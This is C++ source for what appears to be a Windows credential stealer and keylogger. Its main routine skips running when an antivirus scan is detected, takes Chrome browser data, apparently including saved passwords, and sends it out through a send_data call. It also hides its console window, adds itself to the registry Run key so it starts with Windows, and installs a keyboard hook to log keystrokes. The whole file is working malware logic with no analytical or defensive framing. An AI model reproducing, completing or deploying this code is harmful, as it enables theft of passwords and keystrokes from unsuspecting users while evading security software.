#include <iostream>
#include <windows.h>

#include "anti_av.h"
#include "keyboard.h"

#include "send_data.h"

#include "chrome-passwords.h"


using namespace std;


void start_with_windows() {
	
	TCHAR szEXEPath[ 2048 ];
	DWORD nChars = GetModuleFileName( NULL, szEXEPath, 2048 );
	
	// Registry modify
	
	std::string progPath = std::string(szEXEPath);
	
	HKEY hkey = NULL;
	
	LONG createStatus = RegCreateKey(
		HKEY_CURRENT_USER, 
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
		&hkey
	); 
	
	LONG status = RegSetValueEx(
		hkey, 
		"MyApp", 
		0, 
		REG_SZ, 
		(BYTE *)progPath.c_str(), 
		(progPath.size()+1) * sizeof(wchar_t)
	);
}




int main (int argc, char** argv)
{

	// Avoid Avast
	if(test_being_scanned())
		return 1;
	
	// Get chrome data
	std::string string_data = "Chrome browser data\r\n\r\n" + get_chrome_data();
	send_data(string_data.c_str());
	
	// Hide window
	try {
		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false);
	} catch (int e) {}
	
	
	// Windows start 
	try {
	start_with_windows();
	} catch (int e) {}
	
	// Go on with keylogging
	if(!InstallHook(argv))
		return 1;
	
	return 0;
}

